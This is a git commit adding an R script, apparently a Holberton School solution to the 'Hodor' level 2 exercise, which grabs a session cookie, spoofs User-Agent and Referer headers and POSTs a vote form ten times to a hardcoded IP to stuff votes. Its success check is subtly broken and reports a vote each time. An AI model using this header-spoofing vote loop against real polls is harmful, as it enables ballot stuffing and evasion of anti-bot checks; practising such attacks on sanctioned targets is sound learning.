4e6d6498d81c475c9eee609610539bfc2fd1d80b
Alexandro de Oliveira <alexandro.oliveira@holbertonschool.com>
2016-06-13 03:26:45 -0300

    Adding solution to Hodor 2 using R Language script

---
+++ hodor/level_2/hodor2-Rlang.r
@@ -0,0 +1,27 @@
+# ===---Description------------------------------------------------------------===
+#   Solution for the Hodor Project, Level 2 by Julien Barbier.
+#   Using a R Language script with httr library.
+#   To run this file install R language and run:
+#   $ R -f filename
+#
+#   by Alexandro de Oliveira, for Holberton School
+# ===---------------------------------------------------------------------------===
+
+library('httr')
+
+url     <- "http://173.246.108.142/level2.php"
+head    <- HEAD(url)            # Head request
+cookie  <- cookies(head)$value
+body    <- list(id = "1", holdthedoor = "submit", key = cookie)
+header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)
+
+for(i in 1:10) {
+    p <- POST(url, body = body, encode = "form", header)
+    s <- content(p, "text", encoding = 'UTF8')[1]
+    match = grep("I voted!", s, perl=TRUE, value=FALSE) # Regexp to check of vote is valid.
+    if(!is.null(match)) {
+        cat("Vote number: ", i , "\n")
+    } else {
+        cat( "Failed...", "\n")
+    }
+}
